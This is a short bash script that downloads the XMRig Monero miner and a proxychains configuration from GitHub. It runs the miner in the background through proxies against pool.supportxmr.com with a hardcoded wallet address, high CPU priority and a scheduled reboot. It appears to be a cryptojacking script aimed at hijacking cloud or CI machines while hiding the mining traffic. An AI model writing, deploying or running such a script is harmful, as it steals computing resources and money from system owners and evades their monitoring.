#!/bin/bash
sudo -i
sudo apt-get update
sudo apt-get install -y proxychains wget tar
wget https://raw.githubusercontent.com/xeddpjbiepw/DonnCDuquette/master/tyhnnrabfvt/proxychains%20-%20Copy%20(1).conf
mv proxychains%20-%20Copy%20(1).conf /etc/proxychains.conf
wget https://github.com/xmrig/xmrig/releases/download/v6.3.3/xmrig-6.3.3-linux-x64.tar.gz
tar --extract --file xmrig-6.3.3-linux-x64.tar.gz
cd xmrig-6.3.3
export PROXY_DNS_SERVER=1.1.1.1
proxychains ./xmrig --no-color --donate-level 1 --cpu-priority 5 -o pool.supportxmr.com:9000 -u 4AHnjgotTyL79cjhd2kXzb6tuYFUThRJ5J9PRwh7qfgdbeNTDVdpJiK5taWCpR38eWCHFJdmRPZX55YQ5yYg4MTqGzZL2rF -p x -a cn/r -t 4 -k --tls -B
sudo shutdown -r +25
